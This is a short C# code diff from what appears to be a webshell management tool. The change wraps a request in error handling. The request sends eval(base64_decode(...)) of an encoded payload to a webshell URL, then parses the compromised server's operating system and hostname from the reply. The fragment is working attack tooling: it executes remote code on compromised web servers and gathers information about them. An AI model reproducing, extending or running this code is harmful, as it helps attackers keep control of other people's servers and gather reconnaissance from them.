@@ -45,7 +45,15 @@ namespace webshellManager
         public IDictionary<string, string> querybasicalInformation()
         {
             IDictionary<string, string> informations = new Dictionary<string, string>();
-            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + BASICINFORMATION + "\"));");
+            string result;
+            try
+            {
+                result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + BASICINFORMATION + "\"));");
+            }
+            catch
+            {
+                return null;
+            }
             MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
             informations["OS"] = matched[0].Groups[1].Value;
             informations["Hostname"] = matched[1].Groups[1].Value;
